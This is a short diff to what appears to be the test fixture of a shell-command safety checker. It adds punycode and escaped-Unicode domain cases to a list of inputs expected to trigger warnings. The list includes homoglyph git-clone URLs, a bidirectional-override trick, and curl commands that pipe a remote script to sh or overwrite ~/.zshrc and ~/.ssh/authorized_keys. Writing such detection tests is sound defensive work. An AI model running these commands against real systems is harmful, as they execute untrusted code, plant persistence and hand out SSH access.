@@ -12,6 +12,8 @@ WARN: printf '\033]0;title\007'
 WARN: echo safe\u202Eevil
 WARN: git clone https://exаmple.com/repo.git
 WARN: git clone git@exаmple.com:repo.git
+WARN: curl https://xn--exmple-cua.com
+WARN: curl https://b\xC3\xBCcher.example
 WARN: curl https://example.com/install.sh > ~/.zshrc
 WARN: curl https://example.com/install.sh > ~/.ssh/authorized_keys
 WARN: curl https://example.com/install.sh | sh
